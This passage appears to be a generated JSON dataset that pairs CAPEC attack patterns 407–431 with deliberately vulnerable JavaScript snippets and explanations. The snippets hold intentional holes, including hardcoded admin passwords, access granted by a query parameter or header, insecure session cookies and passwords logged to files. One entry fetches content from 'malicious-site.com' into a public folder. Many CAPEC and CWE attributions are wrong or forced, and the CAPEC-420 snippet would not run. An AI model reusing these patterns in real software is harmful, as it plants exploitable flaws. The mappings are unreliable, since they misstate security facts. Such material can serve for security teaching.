        "code_snippet": "const fs = require('fs');\n\n// Simulate storing sensitive information in a file\nconst sensitiveData = 'User: admin, Password: admin123';\nfs.writeFileSync('sensitive_info.txt', sensitiveData);\n\n// Simulate generating a core dump file\nconst coreDump = 'Core dump data...';\nfs.writeFileSync('core_dump.txt', coreDump);\n\n// Simulate storing a version-control repository\nconst gitRepo = 'Repository data...';\nfs.writeFileSync('repo/.git', gitRepo);\n\n// Simulate improper scrubbing of sensitive data\nfunction decommissionDevice() {\n  // Incomplete scrubbing\n  fs.unlinkSync('sensitive_info.txt');\n  // Core dump and git repo are not scrubbed\n}\n\ndecommissionDevice();",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC 'Dumpster Diving' and associated CWEs. It simulates storing sensitive information in a file, generating a core dump file, and storing a version-control repository. The decommissionDevice function attempts to scrub sensitive data but does so incompletely, leaving the core dump and version-control repository accessible. This represents the risk of sensitive information being discarded improperly, making it accessible to unauthorized actors who may search through discarded files or devices."
    },
    {
        "capec_id": "407",
        "capec_name": "Pretexting",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst session = require('express-session');\n\napp.use(session({\n  secret: 'secret-key',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { secure: false }\n}));\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  // Simulate user authentication\n  if (username === 'admin' && password === 'password') {\n    req.session.user = { username: 'admin' };\n    res.send('Logged in');\n  } else {\n    res.send('Invalid credentials');\n  }\n});\n\napp.get('/sensitive-data', (req, res) => {\n  if (req.session.user && req.session.user.username === 'admin') {\n    res.send('Sensitive Information');\n  } else {\n    res.send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server with session management. The code demonstrates a login endpoint and an endpoint to access sensitive data. The login endpoint does not invalidate any existing session identifier (CWE-384), allowing an attacker to potentially hijack an authenticated session. The session cookie is not marked as secure (CWE-300), making it accessible over non-secure channels. The code also does not properly verify the identity of the user accessing the sensitive data endpoint (CWE-200), potentially exposing sensitive information to unauthorized actors. This setup can be exploited by an adversary using pretexting to manipulate users into revealing sensitive information or performing actions that benefit the attacker."
    },
    {
        "capec_id": "408",
        "capec_name": "DEPRECATED: Information Gathering from Traditional Sources",
        "code_snippet": "const fs = require('fs');\n\n// Vulnerable code: Storing sensitive information in a log file\nfunction logSensitiveData(data) {\n  const logFile = 'server.log';\n  fs.appendFileSync(logFile, `Sensitive Data: ${data}\\n`);\n}\n\n// Example usage\nlogSensitiveData('User password: 12345');",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to the deprecated CAPEC-118 and related CWEs, particularly CWE-532 (Information Exposure Through Log Files). The function `logSensitiveData` writes sensitive information, such as user passwords, directly to a log file (`server.log`). This practice can lead to information exposure if the log file is accessed by unauthorized users. The code highlights the risk of storing sensitive data in log files without proper protection, which aligns with the deprecated weaknesses related to information exposure and failure to protect stored data."
    },
    {
        "capec_id": "409",
        "capec_name": "DEPRECATED: Information Gathering from Non-Traditional Sources",
        "code_snippet": "const fs = require('fs');\nconst dns = require('dns');\n\n// Vulnerable code: Storing sensitive data in a log file\nfunction logSensitiveData(data) {\n  fs.appendFile('server.log', `Sensitive Data: ${data}\\n`, (err) => {\n    if (err) throw err;\n    console.log('Sensitive data logged.');\n  });\n}\n\n// Vulnerable code: Making a security decision based on DNS lookup\nfunction checkDomain(domain) {\n  dns.lookup(domain, (err, address) => {\n    if (err) throw err;\n    if (address === '192.168.1.1') {\n      console.log('Domain is trusted.');\n    } else {\n      console.log('Domain is not trusted.');\n    }\n  });\n}\n\n// Example usage\nlogSensitiveData('User password: 12345');\ncheckDomain('example.com');",
        "description": "This JavaScript code snippet demonstrates two deprecated vulnerabilities. The first function, `logSensitiveData`, writes sensitive information to a server log file, which can lead to information exposure (related to CWE-532). The second function, `checkDomain`, makes a security decision based on a DNS lookup, which can be unreliable and lead to security issues (related to CWE-350). These examples embody the deprecated CAPEC pattern of gathering information from non-traditional sources and highlight the associated risks."
    },
    {
        "capec_id": "410",
        "capec_name": "Information Elicitation",
        "code_snippet": "const sensitiveInfo = 'UserPassword123';\n\nfunction handleRequest(request) {\n  if (request.source === 'trustedSource') {\n    console.log('Handling request from trusted source');\n    // Process the request\n  } else {\n    console.log('Handling request from untrusted source');\n    // Process the request\n  }\n}\n\nfunction displayInfo() {\n  const truncatedInfo = sensitiveInfo.substring(0, 5);\n  console.log('Displaying truncated info:', truncatedInfo);\n}\n\n// Simulate an incoming request\nconst incomingRequest = { source: 'untrustedSource' };\nhandleRequest(incomingRequest);\ndisplayInfo();",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive information is handled improperly, embodying the main idea of CAPEC-118: Information Elicitation. The code includes vulnerabilities related to the CWEs mentioned. The `handleRequest` function processes requests based on their source but does not properly verify the source (CWE-940). The `displayInfo` function truncates sensitive information (CWE-222), potentially exposing it to unauthorized actors (CWE-200). The code also shows observable behavioral discrepancies (CWE-205, CWE-207) by logging different messages based on the request source, which could be exploited by an attacker to infer internal states or decision processes."
    },
    {
        "capec_id": "411",
        "capec_name": "DEPRECATED: Pretexting",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\n\n// Middleware to log requests\napp.use((req, res, next) => {\n  const log = `${new Date().toISOString()} - ${req.method} - ${req.url} - ${req.headers['user-agent']}`;\n  fs.appendFile('server.log', log + '\\n', (err) => {\n    if (err) throw err;\n  });\n  next();\n});\n\n// Route that simulates an authentication bypass\napp.get('/admin', (req, res) => {\n  if (req.query.admin === 'true') {\n    res.send('Welcome, Admin!');\n  } else {\n    res.send('Access Denied');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server. It includes middleware to log incoming requests to a file named 'server.log', capturing details such as the request method, URL, and user-agent. This logging mechanism can lead to information exposure through server log files (CWE-532). Additionally, the '/admin' route simulates an authentication bypass vulnerability (CWE-287) by allowing access based on a query parameter without proper authentication checks. The code embodies the main idea of CAPEC-407 by demonstrating how an attacker could gather information through pretexting and exploit weak authentication mechanisms."
    },
    {
        "capec_id": "412",
        "capec_name": "Pretexting via Customer Service",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\napp.use(express.json());\n\napp.post('/customer-service', (req, res) => {\n  const { customerId, creditCardNumber } = req.body;\n  \n  // CWE-940: Improper Verification of Source of a Communication Channel\n  if (!req.headers['x-auth-token']) {\n    return res.status(401).send('Unauthorized');\n  }\n  \n  // CWE-300: Channel Accessible by Non-Endpoint\n  if (req.headers['x-auth-token'] !== 'expected-token') {\n    return res.status(403).send('Forbidden');\n  }\n  \n  // CWE-408: Incorrect Behavior Order: Early Amplification\n  // Performing an expensive operation before proper authentication\n  const customerData = getCustomerData(customerId); // Assume this is an expensive operation\n  \n  // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n  if (!customerData) {\n    return res.status(404).send('Customer not found');\n  }\n  \n  // CWE-925: Improper Verification of Intent by Broadcast Receiver\n  // Assuming this is a broadcast receiver scenario\n  if (req.headers['x-intent-source'] !== 'trusted-source') {\n    return res.status(400).send('Bad Request');\n  }\n  \n  // Simulate sending sensitive information\n  res.send(`Credit Card Number: ${creditCardNumber}`);\n});\n\napp.listen(port, () => {\n  console.log(`Server running on port ${port}`);\n});\n\nfunction getCustomerData(customerId) {\n  // Simulate an expensive operation\n  return { id: customerId, name: 'John Doe' };\n}",
        "description": "This JavaScript code snippet represents a vulnerable customer service endpoint using the Express framework. The endpoint '/customer-service' accepts POST requests with customer data, including a credit card number. The code demonstrates several security weaknesses: \n1. CWE-940: The source of the communication channel is not properly verified, as it only checks for the presence of an 'x-auth-token' header without robust validation.\n2. CWE-300: The channel is accessible by non-endpoints, as the 'x-auth-token' is checked against a hardcoded value, which can be easily bypassed.\n3. CWE-408: An expensive operation (fetching customer data) is performed before proper authentication, leading to potential resource exhaustion.\n4. CWE-200: Sensitive information (credit card number) is exposed to unauthorized actors if the initial checks are bypassed.\n5. CWE-925: The intent source is not properly verified, assuming a broadcast receiver scenario, leading to potential misuse.\n\nThe code highlights the risks of improper verification and the exposure of sensitive information, embodying the main idea of the CAPEC 'Pretexting via Customer Service'."
    },
    {
        "capec_id": "413",
        "capec_name": "Pretexting via Tech Support",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Simulate a tech support pretexting attack\nfunction techSupportPretexting(userInput) {\n  // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n  const sensitiveInfo = 'UserPassword123';\n  console.log(`Sensitive Info: ${sensitiveInfo}`);\n\n  // CWE-434: Unrestricted Upload of File with Dangerous Type\n  const dangerousFilePath = path.join(__dirname, 'dangerousPayload.exe');\n  fs.writeFileSync(dangerousFilePath, 'malicious content');\n  console.log('Dangerous file uploaded.');\n\n  // CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n  const externalFilePath = path.join(__dirname, 'public', 'sensitiveData.txt');\n  fs.writeFileSync(externalFilePath, sensitiveInfo);\n  console.log('Sensitive information written to an externally accessible file.');\n}\n\n// Simulate user input that triggers the attack\ntechSupportPretexting('Please help me with my computer issue.');",
        "description": "This JavaScript code snippet simulates a tech support pretexting attack, where an adversary impersonates a tech support worker to gain unauthorized access to sensitive information and perform malicious actions. The function `techSupportPretexting` demonstrates several vulnerabilities: exposing sensitive information (CWE-200), uploading a dangerous file (CWE-434), and inserting sensitive information into an externally accessible file (CWE-538). The code highlights how an attacker can exploit these weaknesses to compromise a system, aligning with the CAPEC description of pretexting via tech support."
    },
    {
        "capec_id": "414",
        "capec_name": "Pretexting via Delivery Person",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/deliver') {\n    // CWE-941: Incorrectly Specified Destination in a Communication Channel\n    const targetUrl = 'http://malicious-site.com';\n    http.get(targetUrl, (response) => {\n      let data = '';\n      response.on('data', (chunk) => { data += chunk; });\n      response.on('end', () => {\n        // CWE-433: Unparsed Raw Web Content Delivery\n        fs.writeFileSync('public/delivery.txt', data);\n        res.writeHead(200, {'Content-Type': 'text/plain'});\n        res.end('Delivery completed');\n      });\n    }).on('error', (err) => {\n      res.writeHead(500, {'Content-Type': 'text/plain'});\n      res.end('Error in delivery');\n    });\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for requests on port 8080. When a request is made to the '/deliver' endpoint, the server initiates an outgoing request to a malicious site (CWE-941: Incorrectly Specified Destination in a Communication Channel). The response from the malicious site is then written to a file in the public directory (CWE-433: Unparsed Raw Web Content Delivery). This simulates the CAPEC scenario where an adversary, posing as a delivery person, manipulates the target into performing an action that serves the adversary's interests. The code demonstrates how an attacker can exploit incorrect destination specification and unparsed content delivery to achieve their goals."
    },
    {
        "capec_id": "415",
        "capec_name": "Pretexting via Phone",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  const { headers } = req;\n  const userRole = headers['x-user-role'];\n\n  // CWE-940: Improper Verification of Source of a Communication Channel\n  if (userRole === 'admin') {\n    // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n    res.writeHead(200, { 'Content-Type': 'text/plain' });\n    res.end('Sensitive Information: Admin Access Granted');\n  } else {\n    res.writeHead(403, { 'Content-Type': 'text/plain' });\n    res.end('Access Denied');\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It checks the 'x-user-role' header to determine the user's role. If the role is 'admin', it grants access to sensitive information without properly verifying the source of the request (CWE-940). This can lead to exposure of sensitive information to unauthorized actors (CWE-200). The code represents the main idea of the CAPEC by demonstrating how an adversary could exploit improper verification to gain unauthorized access to sensitive information, similar to how pretexting via phone can manipulate individuals into revealing confidential information."
    },
    {
        "capec_id": "416",
        "capec_name": "Manipulate Human Behavior",
        "code_snippet": "const sensitiveData = 'UserPassword123';\n\nfunction handleUserRequest(userRole, requestData) {\n  if (userRole === 'admin') {\n    console.log('Admin access granted.');\n    return sensitiveData;\n  } else if (userRole === 'user') {\n    console.log('User access granted.');\n    return 'Limited data';\n  } else {\n    console.log('Access denied.');\n    return 'No data';\n  }\n}\n\nfunction simulateSocialEngineering() {\n  const roles = ['admin', 'user', 'guest'];\n  roles.forEach(role => {\n    console.log(`Attempting access with role: ${role}`);\n    const data = handleUserRequest(role, {});\n    console.log(`Data received: ${data}`);\n  });\n}\n\nsimulateSocialEngineering();",
        "description": "This JavaScript code snippet demonstrates a simplified scenario of social engineering by manipulating user roles to access sensitive information. The `handleUserRequest` function grants different levels of access based on the user role. The `simulateSocialEngineering` function iterates through different roles, attempting to access data. This represents the CAPEC concept of manipulating human behavior to gain unauthorized access. The code also touches on related CWEs: CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially exposing sensitive data, and CWE-205 (Observable Behavioral Discrepancy) by revealing different behaviors based on user roles."
    },
    {
        "capec_id": "417",
        "capec_name": "Influence Perception",
        "code_snippet": "const users = { 'admin': 'password123' }; // CWE-656: Reliance on Security Through Obscurity\n\nfunction authenticate(username, password) {\n  if (users[username] && users[username] === password) {\n    return 'Authenticated';\n  } else {\n    return 'Authentication Failed';\n  }\n}\n\nfunction socialEngineeringAttack() {\n  const targetUsername = 'admin';\n  const guessedPassword = 'password123'; // CWE-654: Reliance on a Single Factor in a Security Decision\n  const result = authenticate(targetUsername, guessedPassword);\n  console.log(result); // CWE-205: Observable Behavioral Discrepancy\n}\n\nsocialEngineeringAttack();",
        "description": "This JavaScript code snippet demonstrates a simple authentication mechanism that is vulnerable to social engineering attacks. The 'users' object stores usernames and passwords, relying on security through obscurity (CWE-656). The 'authenticate' function checks if the provided username and password match, relying on a single factor for security decisions (CWE-654). The 'socialEngineeringAttack' function simulates an attack where an adversary guesses the password for the 'admin' user and logs the result, which can reveal important information through observable behavioral discrepancies (CWE-205). This code embodies the main idea of the CAPEC by showing how an adversary can exploit the target's perception and weaknesses in the security mechanism to gain unauthorized access."
    },
    {
        "capec_id": "418",
        "capec_name": "Influence Perception of Reciprocation",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  const userAgent = req.headers['user-agent'];\n  if (userAgent) {\n    console.log(`Received request from: ${userAgent}`);\n    // Compliment the user agent to create a sense of trust\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`Wow, your browser (${userAgent}) is really up-to-date! Can you tell us your email for a special offer?`);\n  } else {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('Bad Request');\n  }\n});\n\nserver.listen(8080, () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. When a request is received, it checks for the 'User-Agent' header. If the header is present, it logs the user agent and sends a response that compliments the user's browser. This is a social engineering technique to create a sense of trust and obligation, encouraging the user to provide their email address. This embodies the CAPEC 'Influence Perception of Reciprocation' by using a compliment to elicit sensitive information. The code also demonstrates CWE-940 (Improper Verification of Source of a Communication Channel) as it does not verify the origin of the request, and CWE-300 (Channel Accessible by Non-Endpoint) as it does not ensure the integrity of the communication channel."
    },
    {
        "capec_id": "419",
        "capec_name": "DEPRECATED: Target Influence via Perception of Concession",
        "code_snippet": "const http = require('http');\nconst crypto = require('crypto');\n\nconst server = http.createServer((req, res) => {\n  let algorithm = 'sha256';\n  if (req.headers['downgrade']) {\n    algorithm = 'md5'; // CWE-757: Algorithm Downgrade\n  }\n\n  const hash = crypto.createHash(algorithm).update('sensitive data').digest('hex');\n\n  if (req.url === '/check') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Hash: ' + hash);\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n});\n\nserver.listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that demonstrates several vulnerabilities related to the deprecated CAPEC pattern 'Target Influence via Perception of Concession' and the associated CWEs. The server listens for incoming requests and checks for a 'downgrade' header. If this header is present, it downgrades the hashing algorithm from 'sha256' to 'md5' (CWE-757: Algorithm Downgrade). The server then generates a hash of some sensitive data using the selected algorithm. The response behavior differs based on the URL requested (CWE-203: Observable Discrepancy), revealing whether the '/check' endpoint was accessed successfully. This discrepancy can be observed by unauthorized actors, potentially exposing security-relevant information. The code also demonstrates CWE-205 (Observable Behavioral Discrepancy) by showing different behaviors based on the presence of the 'downgrade' header."
    },
    {
        "capec_id": "420",
        "capec_name": "Influence Perception of Scarcity",
        "code_snippet": "const itemsInStock = 5;\n\nfunction checkOut(itemCount) {\n  if (itemCount > itemsInStock) {\n    console.log('Error: Not enough items in stock.');\n    return;\n  }\n  if (itemCount > 0 && itemCount <= itemsInStock) {\n    console.log('Success: Items added to cart.');\n    itemsInStock -= itemCount;\n  } else {\n    console.log('Error: Invalid item count.');\n  }\n}\n\nfunction createUrgency() {\n  if (itemsInStock <= 2) {\n    console.log('Hurry! Only ' + itemsInStock + ' items left in stock!');\n  }\n}\n\n// Simulate user actions\ncreateUrgency();\ncheckOut(3);\ncreateUrgency();\ncheckOut(2);\ncreateUrgency();",
        "description": "This JavaScript code snippet simulates an e-commerce scenario where the perception of scarcity is used to influence user behavior. The `checkOut` function checks if the requested item count is available in stock and updates the stock count accordingly. The `createUrgency` function generates a message to create a sense of urgency when the stock is low (2 or fewer items). This embodies the CAPEC concept of leveraging scarcity to influence decisions. The code also touches on related CWEs: it relies on a single factor (item count) for decision-making (CWE-654), and it could be exploited to create an asymmetric resource consumption scenario (CWE-405) if not properly controlled."
    },
    {
        "capec_id": "421",
        "capec_name": "Influence Perception of Authority",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  const { headers } = req;\n  if (headers['x-admin-auth'] === 'admin123') { // CWE-654: Reliance on a Single Factor in a Security Decision\n    res.writeHead(200, { 'Content-Type': 'text/plain' });\n    res.end('Access granted to sensitive information.');\n  } else {\n    res.writeHead(403, { 'Content-Type': 'text/plain' });\n    res.end('Access denied.');\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://127.0.0.1:3000/');\n});\n\n// Simulate an attacker impersonating an admin\nconst options = {\n  hostname: '127.0.0.1',\n  port: 3000,\n  path: '/',\n  method: 'GET',\n  headers: {\n    'x-admin-auth': 'admin123' // CWE-940: Improper Verification of Source of a Communication Channel\n  }\n};\n\nconst req = http.request(options, (res) => {\n  let data = '';\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n  res.on('end', () => {\n    console.log(data); // Should print 'Access granted to sensitive information.'\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a simple HTTP server that grants access to sensitive information based on a single header value ('x-admin-auth'). This represents CWE-654 (Reliance on a Single Factor in a Security Decision). An attacker can easily impersonate an admin by including the correct header value in their request, demonstrating CWE-940 (Improper Verification of Source of a Communication Channel). The code highlights how an adversary can exploit weak authentication mechanisms to gain unauthorized access, embodying the main idea of the CAPEC 'Influence Perception of Authority'."
    },
    {
        "capec_id": "422",
        "capec_name": "Influence Perception of Commitment and Consistency",
        "code_snippet": "const express = require('express');\nconst app = express();\nlet requestCount = 0;\n\napp.use((req, res, next) => {\n  requestCount++;\n  if (requestCount > 100) {\n    res.status(429).send('Too many requests');\n    return;\n  }\n  next();\n});\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'admin' && password === 'password') {\n    res.send('Login successful');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.post('/action', (req, res) => {\n  const { action } = req.body;\n  if (action === 'minorTask') {\n    res.send('Minor task completed');\n  } else if (action === 'majorTask') {\n    res.send('Major task completed');\n  } else {\n    res.status(400).send('Invalid action');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that demonstrates the concept of 'Influence Perception of Commitment and Consistency' (CAPEC-799). The server has two endpoints: '/login' and '/action'. The '/login' endpoint simulates a login process, while the '/action' endpoint allows users to perform tasks. The code includes a middleware function to limit the number of requests (CWE-799) and checks for valid actions (CWE-203). The idea is to show how an attacker could use minor tasks to influence the user to perform larger tasks, while also highlighting potential weaknesses such as improper control of interaction frequency and observable discrepancies."
    },
    {
        "capec_id": "423",
        "capec_name": "Influence Perception of Liking",
        "code_snippet": "const users = [{ id: 1, name: 'Alice', password: 'password123' }, { id: 2, name: 'Bob', password: 'qwerty' }];\n\nfunction authenticate(user, password) {\n  return users.some(u => u.name === user && u.password === password);\n}\n\nfunction performSensitiveAction(user) {\n  if (authenticate(user.name, user.password)) {\n    console.log(`Sensitive action performed for ${user.name}`);\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\n// Adversary builds a relationship with the target\nconst adversary = { name: 'Charlie', password: 'password123' };\n\n// Adversary influences the target to perform an action\nperformSensitiveAction(adversary);",
        "description": "This JavaScript code snippet demonstrates a simple authentication mechanism that is vulnerable to several weaknesses described in the CAPEC and related CWEs. The `authenticate` function checks if a user's name and password match any entry in the `users` array. The `performSensitiveAction` function performs a sensitive action if the user is authenticated.\n\nThe adversary, represented by the `adversary` object, builds a relationship with the target and influences them to perform a sensitive action. The adversary uses a common password ('password123') to exploit the system's reliance on a single factor for authentication (CWE-654) and the use of weak passwords (CWE-301). The code also demonstrates reliance on security through obscurity (CWE-656) and observable behavioral discrepancies (CWE-205) by logging authentication success or failure.\n\nThis snippet embodies the main idea of the CAPEC by showing how an adversary can influence a target to perform actions by exploiting weak authentication mechanisms and building a relationship with the target."
    },
    {
        "capec_id": "424",
        "capec_name": "Influence Perception of Consensus or Social Proof",
        "code_snippet": "const users = ['user1', 'user2', 'user3'];\nlet currentUser = 'user4';\n\nfunction authenticate(user) {\n  if (users.includes(user)) {\n    console.log('Access granted');\n    return true;\n  } else {\n    console.log('Access denied');\n    return false;\n  }\n}\n\nfunction performAction(action) {\n  if (authenticate(currentUser)) {\n    console.log(`Performing action: ${action}`);\n  } else {\n    console.log('Action not allowed');\n  }\n}\n\n// Adversary influences the target to use a specific user\ncurrentUser = 'user1'; // Influenced by adversary\nperformAction('delete');",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary influences the target's actions by leveraging social proof. The `authenticate` function checks if the `currentUser` is in the list of authorized `users`. The `performAction` function performs an action only if the user is authenticated. The adversary influences the target to change the `currentUser` to 'user1', an authorized user, to perform a restricted action. This embodies the CAPEC idea of influencing perception of consensus or social proof. The code also highlights CWE-654 (Reliance on a Single Factor in a Security Decision) by relying solely on the username for authentication, and CWE-203 (Observable Discrepancy) by providing different console messages based on authentication success or failure."
    },
    {
        "capec_id": "425",
        "capec_name": "Target Influence via Framing",
        "code_snippet": "const userInput = prompt('Please enter your username:');\n\nif (userInput) {\n  const isValidUser = validateUser(userInput);\n  if (isValidUser) {\n    const userAction = prompt('Would you like to upgrade your security settings? (Yes/No)');\n    if (userAction.toLowerCase() === 'yes') {\n      alert('Security settings upgraded successfully!');\n    } else {\n      alert('Security settings remain unchanged.');\n    }\n  } else {\n    alert('Invalid user.');\n  }\n} else {\n  alert('No input provided.');\n}\n\nfunction validateUser(username) {\n  // Simulate a user validation process\n  return username === 'admin';\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary could use framing techniques to influence a user's decision. The code prompts the user to enter their username and then asks if they would like to upgrade their security settings. The framing technique is used by presenting the security upgrade in a positive light, making the user more likely to agree. The code also embodies several related CWEs: reliance on a single factor in a security decision (CWE-654) by only checking the username, potential UI misrepresentation (CWE-451) by not providing enough context about the security upgrade, and the possibility of an algorithm downgrade (CWE-757) if the 'upgrade' actually selects a less secure option. Additionally, the code does not verify the integrity of the communication channel (CWE-300) or correctly specify the destination (CWE-941), making it vulnerable to interception or redirection."
    },
    {
        "capec_id": "426",
        "capec_name": "Influence via Incentives",
        "code_snippet": "const users = [{id: 1, name: 'Alice', balance: 100}, {id: 2, name: 'Bob', balance: 50}];\n\nfunction transferFunds(senderId, receiverId, amount) {\n  const sender = users.find(user => user.id === senderId);\n  const receiver = users.find(user => user.id === receiverId);\n\n  if (!sender || !receiver) {\n    console.log('Invalid user IDs');\n    return;\n  }\n\n  if (sender.balance < amount) {\n    console.log('Insufficient funds');\n    return;\n  }\n\n  // Incentivize the sender with a bonus for transferring funds\n  sender.balance -= amount;\n  receiver.balance += amount;\n  sender.balance += 10; // Bonus for transferring funds\n\n  console.log(`Transfer complete. Sender's new balance: ${sender.balance}, Receiver's new balance: ${receiver.balance}`);\n}\n\n// Example usage\ntransferFunds(1, 2, 30);",
        "description": "This JavaScript code snippet represents the CAPEC 'Influence via Incentives' by incentivizing a user to transfer funds through a bonus mechanism. The function `transferFunds` allows a user to transfer money to another user and receives a bonus for doing so. This can be exploited by an adversary to drain resources (CWE-405) or create an emergent resource (CWE-1229) by repeatedly transferring funds to gain bonuses. The code also demonstrates reliance on a single factor (user ID) for security decisions (CWE-654), and does not properly handle invalid user IDs or balances, which could lead to incorrect operations (CWE-941)."
    },
    {
        "capec_id": "427",
        "capec_name": "Influence via Psychological Principles",
        "code_snippet": "const userInput = prompt('Enter your password:');\n\nfunction authenticate(password) {\n  const storedPassword = 'securePassword123';\n  if (password === storedPassword) {\n    console.log('Access granted');\n  } else {\n    console.log('Access denied');\n  }\n}\n\n// Simulate an attacker influencing the user\nconst attackerInfluence = 'securePassword123';\nif (userInput === attackerInfluence) {\n  console.log('User influenced by attacker');\n  authenticate(userInput);\n} else {\n  console.log('User not influenced');\n  authenticate(userInput);\n}",
        "description": "This JavaScript code snippet demonstrates a simple authentication mechanism where a user is prompted to enter a password. The `authenticate` function checks the entered password against a stored password. The code also simulates an attacker influencing the user by providing the correct password. This represents the CAPEC concept of 'Influence via Psychological Principles' by showing how an attacker can manipulate a user's behavior to gain access. The code also touches on related CWEs: CWE-654 (Reliance on a Single Factor in a Security Decision) by relying solely on password matching for authentication, and CWE-301 (Reflection Attack in an Authentication Protocol) by showing how an attacker can use the system to authenticate themselves."
    },
    {
        "capec_id": "428",
        "capec_name": "Influence via Modes of Thinking",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    const message = data.toString();\n    if (message.includes('password')) {\n      console.log('Sensitive information received:', message);\n    }\n    // Reflecting the message back to the sender\n    socket.write(`Echo: ${message}`);\n  });\n});\n\nserver.listen(1337, '127.0.0.1');\n\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n  client.write('Hello, please send your password');\n});\n\nclient.on('data', (data) => {\n  console.log('Received:', data.toString());\n  client.destroy(); // Close the connection after receiving the response\n});",
        "description": "This JavaScript code snippet creates a simple TCP server and client using the 'net' module. The server listens for incoming data and logs any message containing the word 'password', reflecting the message back to the sender. The client connects to the server and sends a message requesting a password. This code demonstrates the CAPEC concept of 'Influence via Modes of Thinking' by tailoring communication to elicit sensitive information. It also embodies related CWEs: CWE-300 (Channel Accessible by Non-Endpoint) as the server does not verify the identity of the client, CWE-940 (Improper Verification of Source of a Communication Channel) as the server does not verify the origin of the request, and CWE-301 (Reflection Attack in an Authentication Protocol) as the server reflects the message back to the client."
    },
    {
        "capec_id": "429",
        "capec_name": "Target Influence via Eye Cues",
        "code_snippet": "document.addEventListener('mousemove', function(event) {\n  let eyeMovement = { x: event.clientX, y: event.clientY };\n  let sensitiveInfo = 'Sensitive Data';\n  let displayElement = document.getElementById('display');\n  if (eyeMovement.x > 100 && eyeMovement.y > 100) {\n    displayElement.innerText = sensitiveInfo;\n  } else {\n    displayElement.innerText = 'Public Data';\n  }\n});",
        "description": "This JavaScript code snippet listens for mouse movements and changes the displayed information based on the cursor's position, simulating eye movement tracking. If the cursor (representing eye movement) is in a specific area, it displays sensitive information; otherwise, it shows public data. This embodies the CAPEC concept of 'Target Influence via Eye Cues' by using non-verbal cues (cursor position) to reveal sensitive information. The code also demonstrates CWE-203 (Observable Discrepancy) as the displayed information changes based on cursor position, potentially revealing security-relevant information. CWE-451 (UI Misrepresentation of Critical Information) is also relevant as the UI changes the displayed information based on cursor position, which could mislead the user."
    },
    {
        "capec_id": "430",
        "capec_name": "DEPRECATED:  Target Influence via Micro-Expressions",
        "code_snippet": "const sensitiveData = 'user_password';\n\nfunction logSensitiveData() {\n  console.log('Sensitive Data: ' + sensitiveData);\n}\n\nfunction speculativeExecution() {\n  let transientData = null;\n  if (Math.random() > 0.5) {\n    transientData = sensitiveData;\n  }\n  return transientData;\n}\n\n// Simulate speculative execution\nconst exposedData = speculativeExecution();\nif (exposedData) {\n  logSensitiveData();\n}",
        "description": "This JavaScript code snippet demonstrates a simplified scenario of speculative execution leading to information exposure. The `sensitiveData` variable holds sensitive information. The `speculativeExecution` function simulates a speculative execution scenario where, based on a random condition, it transiently accesses the sensitive data. If the speculative execution exposes the sensitive data, it is logged by the `logSensitiveData` function. This example embodies the main idea of the deprecated CAPEC 'Target Influence via Micro-Expressions' by showing how transient execution can lead to the exposure of sensitive information, aligning with CWE-1420 and CWE-1342."
    },
    {
        "capec_id": "431",
        "capec_name": "DEPRECATED:  Target Influence via Neuro-Linguistic Programming (NLP)",
